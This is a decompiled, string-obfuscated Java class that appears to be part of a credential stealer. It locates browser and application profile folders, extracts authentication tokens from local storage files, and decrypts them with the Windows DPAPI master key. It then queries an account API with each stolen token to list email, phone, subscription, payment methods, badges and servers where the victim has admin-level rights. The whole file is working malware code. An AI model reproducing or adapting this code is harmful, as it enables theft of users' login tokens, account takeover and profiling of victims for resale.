/*
 * Decompiled with CFR 0.152.
 */
package x;

import aether.browser.DpapiDecryptor;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public final class n {
    private static final OkHttpClient a = new OkHttpClient.Builder().connectTimeout(10L, TimeUnit.SECONDS).readTimeout(10L, TimeUnit.SECONDS).build();
    private static final Pattern b = Pattern.compile($S.d(377));
    private static final Pattern c = Pattern.compile($S.d(378));

    private static String a(int n2) {
        ArrayList<String> arrayList = new ArrayList<String>();
        if ((n2 & 1) != 0) {
            arrayList.add($S.d(271));
        }
        if ((n2 & 2) != 0) {
            arrayList.add($S.d(272));
        }
        if ((n2 & 4) != 0) {
            arrayList.add($S.d(273));
        }
        if ((n2 & 8) != 0) {
            arrayList.add($S.d(274));
        }
        if ((n2 & 0x40) != 0) {
            arrayList.add($S.d(275));
        }
        if ((n2 & 0x80) != 0) {
            arrayList.add($S.d(276));
        }
        if ((n2 & 0x100) != 0) {
            arrayList.add($S.d(277));
        }
        if ((n2 & 0x200) != 0) {
            arrayList.add($S.d(278));
        }
        if ((n2 & 0x4000) != 0) {
            arrayList.add($S.d(279));
        }
        if ((n2 & 0x20000) != 0) {
            arrayList.add($S.d(280));
        }
        if ((n2 & 0x400000) != 0) {
            arrayList.add($S.d(281));
        }
        if (arrayList.isEmpty()) {
            return "";
        }
        return String.join((CharSequence)" ", arrayList);
    }

    private static String a(String string, int n2) {
        if (n2 == 0 && (string == null || string.isEmpty())) {
            return "";
        }
        if (string == null || string.isEmpty()) {
            if (n2 > 0) {
                return $S.d(282);
            }
            return "";
        }
        long l2 = n.b(string);
        if (l2 >= 72L) {
            return $S.d(283);
        }
        if (l2 >= 60L) {
            return $S.d(284);
        }
        if (l2 >= 36L) {
            return $S.d(285);
        }
        if (l2 >= 24L) {
            return $S.d(286);
        }
        if (l2 >= 12L) {
            return $S.d(287);
        }
        if (l2 >= 6L) {
            return $S.d(288);
        }
        if (l2 >= 3L) {
            return $S.d(289);
        }
        return $S.d(282);
    }

    private static String a(String string) {
        if (string == null || string.isEmpty()) {
            return "";
        }
        long l2 = n.b(string);
        if (l2 >= 24L) {
            return $S.d(290);
        }
        if (l2 >= 18L) {
            return $S.d(291);
        }
        if (l2 >= 15L) {
            return $S.d(292);
        }
        if (l2 >= 12L) {
            return $S.d(293);
        }
        if (l2 >= 9L) {
            return $S.d(294);
        }
        if (l2 >= 6L) {
            return $S.d(295);
        }
        if (l2 >= 3L) {
            return $S.d(296);
        }
        if (l2 >= 2L) {
            return $S.d(297);
        }
        return $S.d(298);
    }

    private static long b(String string) {
        try {
            long l2 = System.currentTimeMillis() - Instant.parse(string).toEpochMilli();
            return l2 / 2592000000L;
        }
        catch (Exception exception) {
            return 0L;
        }
    }

    private static String b(int n2) {
        if (n2 == 1) {
            return $S.d(299);
        }
        if (n2 == 2) {
            return $S.d(300);
        }
        if (n2 == 3) {
            return $S.d(301);
        }
        return $S.d(270);
    }

    public static List<a> a() {
        String[] stringArray;
        int n2;
        HashSet<String> hashSet = new HashSet<String>();
        ArrayList<a> arrayList = new ArrayList<a>();
        String[][] stringArrayArray = $S.d(212);
        stringArrayArray = System.getenv((String)stringArrayArray);
        Object object = new ArrayList();
        if (stringArrayArray != null) {
            stringArrayArray = new String[][]{{$S.d(136), (String)stringArrayArray + $S.d(302)}, {$S.d(303), stringArrayArray + $S.d(304)}, {$S.d(305), stringArrayArray + $S.d(306)}, {$S.d(307), stringArrayArray + $S.d(308)}, {$S.d(309), stringArrayArray + $S.d(310)}, {$S.d(209), stringArrayArray + $S.d(231)}, {$S.d(311), stringArrayArray + $S.d(230)}};
            int cfr_ignored_0 = stringArrayArray.length;
            for (n2 = 0; n2 < 7; ++n2) {
                stringArray = stringArrayArray[n2];
                object.add(stringArray);
            }
        }
        stringArrayArray = object.iterator();
        while (stringArrayArray.hasNext()) {
            object = (String[])stringArrayArray.next();
            if (!((File)(object = new File(object[1]))).exists()) continue;
            byte[] byArray = n.c(((File)object).getAbsolutePath());
            object = new File((File)object, $S.d(312) + File.separator + $S.d(313));
            object = n.a(((File)object).getAbsolutePath(), byArray);
            stringArray = object.iterator();
            while (stringArray.hasNext()) {
                String string = stringArray.next();
                if (!hashSet.add(string)) continue;
                n.a(string, arrayList);
            }
        }
        stringArrayArray = $S.d(211);
        stringArrayArray = System.getenv((String)stringArrayArray);
        object = new ArrayList();
        if (stringArrayArray != null) {
            stringArrayArray = new String[][]{{$S.d(203), stringArrayArray + $S.d(215)}, {$S.d(204), stringArrayArray + $S.d(216)}, {$S.d(205), stringArrayArray + $S.d(217)}, {$S.d(206), stringArrayArray + $S.d(218)}, {$S.d(219), stringArrayArray + $S.d(220)}, {$S.d(207), stringArrayArray + $S.d(221)}};
            int cfr_ignored_1 = stringArrayArray.length;
            for (n2 = 0; n2 < 6; ++n2) {
                stringArray = stringArrayArray[n2];
                object.add(stringArray);
            }
        }
        stringArrayArray = object.iterator();
        while (stringArrayArray.hasNext()) {
            object = (String[])stringArrayArray.next();
            if (!((File)(object = new File((String)object[1]))).exists()) continue;
            byte[] byArray = n.c(((File)object).getAbsolutePath());
            try {
                object = ((File)object).listFiles();
                if (object == null) continue;
                for (Iterator<String> iterator2 : object) {
                    String string;
                    if (iterator2 == null || !((File)((Object)iterator2)).isDirectory() || !(string = ((File)((Object)iterator2)).getName()).equals($S.d(59)) && !string.matches($S.d(314))) continue;
                    iterator2 = new File((File)((Object)iterator2), $S.d(315));
                    iterator2 = n.a(((File)((Object)iterator2)).getAbsolutePath(), byArray).iterator();
                    while (iterator2.hasNext()) {
                        string = iterator2.next();
                        if (!hashSet.add(string)) continue;
                        n.a(string, arrayList);
                    }
                }
            }
            catch (Exception exception) {
            }
        }
        return arrayList;
    }

    private static byte[] c(String string) {
        try {
            File file = new File(string, $S.d(316));
            if (!file.exists()) {
                file = new File(new File(string).getParentFile().getParentFile(), $S.d(316));
            }
            if (!file.exists()) {
                return null;
            }
            return DpapiDecryptor.b(file.getAbsolutePath());
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static Set<String> a(String fileArray, byte[] byArray) {
        LinkedHashSet<String> linkedHashSet = new LinkedHashSet<String>();
        if (!((File)(fileArray = new File((String)fileArray))).exists() || !((File)fileArray).isDirectory()) {
            return linkedHashSet;
        }
        if ((fileArray = ((File)fileArray).listFiles()) == null) {
            return linkedHashSet;
        }
        try {
            for (Object object : fileArray) {
                Object object2;
                if (object == null || !((String)(object2 = ((File)object).getName())).endsWith($S.d(317)) && !((String)object2).endsWith($S.d(318))) continue;
                try {
                    String string = new String(Files.readAllBytes(((File)object).toPath()), StandardCharsets.ISO_8859_1);
                    object2 = b.matcher(string);
                    while (((Matcher)object2).find()) {
                        linkedHashSet.add(((Matcher)object2).group());
                    }
                    if (byArray == null) continue;
                    Matcher matcher = c.matcher(string);
                    while (matcher.find()) {
                        object2 = n.a(byArray, matcher.group(1));
                        if (object2 == null || ((String)(object2 = ((String)object2).split("\n")[0].trim())).isEmpty()) continue;
                        linkedHashSet.add((String)object2);
                    }
                }
                catch (Exception exception) {}
            }
        }
        catch (Exception exception) {}
        return linkedHashSet;
    }

    private static String a(byte[] object, String object2) {
        try {
            byte[] byArray = Base64.getDecoder().decode((String)object2);
            object2 = byArray;
            String string = DpapiDecryptor.a(byArray, (byte[])object);
            object = string;
            if (string != null && !((String)object).isEmpty()) {
                return object;
            }
            return null;
        }
        catch (Exception exception) {
            return null;
        }
    }

    /*
     * WARNING - void declaration
     */
    private static void a(String string, List<a> list2) {
        try {
            a a2;
            block45: {
                Object object;
                Object object3;
                Object object4;
                Object object5;
                block44: {
                    void var12_37;
                    void var12_35;
                    void var12_33;
                    Object object2;
                    Object object822;
                    Object object9;
                    try {
                        object5 = n.a($S.d(319), string);
                    }
                    catch (IOException iOException) {
                        a a3 = new a();
                        new a().a = string;
                        a3.l = true;
                        try {
                            String string2 = string.split("\\.")[0];
                            int n2 = (4 - string2.length() % 4) % 4;
                            string2 = string2 + $S.d(320).substring(0, n2);
                            a3.b = new String(Base64.getDecoder().decode(string2), StandardCharsets.UTF_8).trim();
                        }
                        catch (Exception exception) {
                            a3.b = $S.d(321);
                        }
                        a3.c = $S.d(321);
                        list2.add(a3);
                        return;
                    }
                    if (object5 == null || !((JsonObject)object5).has("id")) {
                        return;
                    }
                    a2 = new a();
                    new a().a = string;
                    a2.b = n.a((JsonObject)object5, "id");
                    a2.c = n.a((JsonObject)object5, $S.d(322));
                    a2.d = n.a((JsonObject)object5, $S.d(323));
                    a2.e = n.a((JsonObject)object5, $S.d(324));
                    Object object10 = n.a((JsonObject)object5, $S.d(325));
                    if (!((String)object10).isEmpty()) {
                        a2.i = $S.d(326) + a2.b + "/" + (String)object10 + $S.d(327);
                    }
                    int n3 = n.b((JsonObject)object5, $S.d(328));
                    a2.f = n.b(n3);
                    object4 = null;
                    object10 = null;
                    ArrayList<JsonObject> arrayList = new ArrayList<JsonObject>();
                    try {
                        object9 = n.a($S.d(329) + a2.b + $S.d(330), string);
                        if (object9 != null) {
                            object4 = n.a((JsonObject)object9, $S.d(331));
                            object10 = n.a((JsonObject)object9, $S.d(332));
                            if (((JsonObject)object9).has($S.d(333)) && ((JsonObject)object9).get($S.d(333)).isJsonArray()) {
                                for (Object object822 : ((JsonObject)object9).getAsJsonArray($S.d(333))) {
                                    if (!((JsonElement)object822).isJsonObject()) continue;
                                    arrayList.add(((JsonElement)object822).getAsJsonObject());
                                }
                            }
                        }
                    }
                    catch (Exception exception) {}
                    if (object10 == null || ((String)object10).isEmpty()) {
                        try {
                            object9 = n.b($S.d(334), string);
                            if (object9 != null && ((JsonArray)object9).size() > 0) {
                                long l2 = Long.MAX_VALUE;
                                object9 = ((JsonArray)object9).iterator();
                                while (object9.hasNext()) {
                                    object3 = (JsonElement)object9.next();
                                    JsonObject object72 = ((JsonElement)object3).getAsJsonObject();
                                    object2 = n.a(object72, $S.d(335));
                                    if (((String)object2).isEmpty()) {
                                        object2 = n.a(object72, $S.d(336));
                                    }
                                    if (((String)object2).isEmpty()) continue;
                                    try {
                                        long l3 = Instant.parse((CharSequence)object2).toEpochMilli();
                                        if (l3 >= l2) continue;
                                        l2 = l3;
                                        object10 = object2;
                                    }
                                    catch (Exception exception) {}
                                }
                                if (object10 == null) {
                                    object10 = new Date().toInstant().toString();
                                }
                            }
                        }
                        catch (Exception exception) {}
                    }
                    int n4 = n.b((JsonObject)object5, $S.d(337));
                    ArrayList<String> arrayList2 = new ArrayList<String>();
                    object822 = n.a(n4);
                    if (!((String)object822).isEmpty()) {
                        arrayList2.add((String)object822);
                    }
                    Object object11 = new LinkedHashMap<String, String>();
                    object11.put($S.d(338), $S.d(339));
                    object11.put($S.d(340), $S.d(339));
                    object11.put($S.d(341), $S.d(342));
                    object11.put($S.d(343), $S.d(344));
                    object11.put($S.d(345), $S.d(344));
                    for (JsonObject jsonObject : arrayList) {
                        object2 = n.a(jsonObject, "id");
                        String string2 = (String)object11.get(object2);
                        if (string2 == null || arrayList2.contains(string2)) continue;
                        arrayList2.add(string2);
                    }
                    object3 = n.a((String)object4, n3);
                    if (!((String)object3).isEmpty() && !arrayList2.contains(object3)) {
                        arrayList2.add((String)object3);
                    }
                    String string3 = "";
                    object2 = new LinkedHashMap<String, String>();
                    object2.put($S.d(346), $S.d(298));
                    object2.put($S.d(347), $S.d(297));
                    object2.put($S.d(348), $S.d(296));
                    object2.put($S.d(349), $S.d(295));
                    object2.put($S.d(350), $S.d(294));
                    object2.put($S.d(351), $S.d(293));
                    object2.put($S.d(352), $S.d(292));
                    object2.put($S.d(353), $S.d(291));
                    object2.put($S.d(354), $S.d(290));
                    for (JsonObject jsonObject : arrayList) {
                        object5 = (String)object2.get(n.a(jsonObject, "id"));
                        if (object5 == null) continue;
                        Iterator<JsonElement> iterator2 = object5;
                        break;
                    }
                    if (var12_33.isEmpty() && object10 != null && !((String)object10).isEmpty()) {
                        String string4 = n.a((String)object10);
                    }
                    if (var12_35.isEmpty() && n3 == 2) {
                        String string5 = n.a((String)(object4 != null ? object4 : ""));
                    }
                    if (!var12_37.isEmpty() && !arrayList2.contains(var12_37)) {
                        arrayList2.add((String)var12_37);
                    }
                    a2.h = arrayList2.isEmpty() ? $S.d(270) : String.join((CharSequence)" ", (Iterable<? extends CharSequence>)arrayList2);
                    try {
                        object = n.b($S.d(355), string);
                        if (object != null && ((JsonArray)object).size() > 0) {
                            a2.g = $S.d(356);
                        }
                    }
                    catch (Exception exception) {}
                    try {
                        object = n.b($S.d(357), string);
                        if (object == null) break block44;
                        Iterator<JsonElement> iterator3 = ((JsonArray)object).iterator();
                        while (iterator3.hasNext()) {
                            object5 = iterator3.next();
                            object10 = ((JsonElement)object5).getAsJsonObject();
                            if (!((JsonObject)object10).has($S.d(358)) || !((JsonObject)object10).get($S.d(358)).getAsBoolean()) continue;
                            ArrayList<String> arrayList3 = new ArrayList<String>();
                            object4 = ((JsonObject)object10).has($S.d(359)) && ((JsonObject)object10).get($S.d(359)).isJsonArray() ? ((JsonObject)object10).getAsJsonArray($S.d(359)) : new JsonArray();
                            Iterator<JsonElement> iterator2 = ((JsonArray)object4).iterator();
                            while (iterator2.hasNext()) {
                                object11 = iterator2.next();
                                object3 = ((JsonElement)object11).getAsString();
                                if (((String)object3).equals($S.d(360))) {
                                    arrayList3.add($S.d(361));
                                    continue;
                                }
                                if (((String)object3).equals($S.d(362))) {
                                    arrayList3.add($S.d(363));
                                    continue;
                                }
                                if (!((String)object3).equals($S.d(364))) continue;
                                arrayList3.add($S.d(365));
                            }
                            int n5 = ((JsonObject)object10).has($S.d(366)) ? ((JsonObject)object10).get($S.d(366)).getAsInt() : 0;
                            object11 = "`" + n.a((JsonObject)object10, $S.d(9)) + $S.d(367) + n5 + $S.d(368) + (arrayList3.isEmpty() ? "" : " [" + String.join((CharSequence)", ", arrayList3) + "]");
                            a2.k.add((String)object11);
                            if (a2.k.size() < 15) {
                                continue;
                            }
                            break;
                        }
                    }
                    catch (Exception exception) {}
                }
                try {
                    object = n.b($S.d(369), string);
                    if (object == null) break block45;
                    int[] nArray = new int[]{0, 1, 2, 3, 9, 14, 17, 22};
                    object5 = ((JsonArray)object).iterator();
                    while (object5.hasNext()) {
                        JsonElement jsonElement = object5.next();
                        JsonObject jsonObject = jsonElement.getAsJsonObject();
                        if (!jsonObject.has($S.d(3)) || jsonObject.get($S.d(3)).getAsInt() != 1 || (object4 = jsonObject.has($S.d(370)) ? jsonObject.getAsJsonObject($S.d(370)) : null) == null) continue;
                        int n6 = n.b((JsonObject)object4, $S.d(337));
                        boolean bl = false;
                        object3 = nArray;
                        int cfr_ignored_0 = nArray.length;
                        for (int i2 = 0; i2 < 8; ++i2) {
                            Object object12 = object3[i2];
                            if ((n6 & 1 << object12) == 0) continue;
                            bl = true;
                            break;
                        }
                        if (!bl) continue;
                        object3 = n.a(n6);
                        String string4 = "`" + n.a((JsonObject)object4, $S.d(322)) + "` " + (String)(((String)object3).isEmpty() ? "" : object3);
                        a2.j.add(string4.trim());
                        if (a2.j.size() < 15) {
                            continue;
                        }
                        break;
                    }
                }
                catch (Exception exception) {}
            }
            list2.add(a2);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private static JsonObject a(String object, String string) throws IOException {
        object = new Request.Builder().url($S.d(371) + (String)object).header($S.d(372), string).header($S.d(373), $S.d(374)).header($S.d(375), $S.d(376)).build();
        object = a.newCall((Request)object).execute();
        try {
            int n2 = ((Response)object).code();
            if (n2 == 401) {
                return null;
            }
            String string2 = ((Response)object).body() != null ? ((Response)object).body().string() : "";
            if (string2.isEmpty()) {
                return null;
            }
            JsonElement jsonElement = JsonParser.parseString(string2);
            jsonElement = jsonElement.isJsonObject() ? jsonElement.getAsJsonObject() : null;
            return jsonElement;
        }
        finally {
            if (object != null) {
                ((Response)object).close();
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static JsonArray b(String object, String object2) {
        try {
            object = new Request.Builder().url($S.d(371) + (String)object).header($S.d(372), (String)object2).header($S.d(373), $S.d(374)).header($S.d(375), $S.d(376)).build();
            object = a.newCall((Request)object).execute();
            try {
                if (!((Response)object).isSuccessful()) return null;
                if (((Response)object).body() == null) {
                    return null;
                }
                object2 = JsonParser.parseString(((Response)object).body().string());
                JsonArray jsonArray = ((JsonElement)object2).isJsonArray() ? ((JsonElement)object2).getAsJsonArray() : null;
                return jsonArray;
            }
            finally {
                if (object != null) {
                    ((Response)object).close();
                }
            }
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String a(JsonObject jsonObject, String string) {
        try {
            if (jsonObject.has(string) && !jsonObject.get(string).isJsonNull()) {
                return jsonObject.get(string).getAsString();
            }
        }
        catch (Exception exception) {}
        return "";
    }

    private static int b(JsonObject jsonObject, String string) {
        try {
            if (jsonObject.has(string) && !jsonObject.get(string).isJsonNull()) {
                return jsonObject.get(string).getAsInt();
            }
        }
        catch (Exception exception) {}
        return 0;
    }

    public static final class a {
        public String a;
        public String b;
        public String c;
        public String d;
        public String e;
        public String f = $S.d(270);
        public String g = "No";
        public String h = $S.d(270);
        public String i;
        public List<String> j = new ArrayList<String>();
        public List<String> k = new ArrayList<String>();
        public boolean l = false;
    }
}

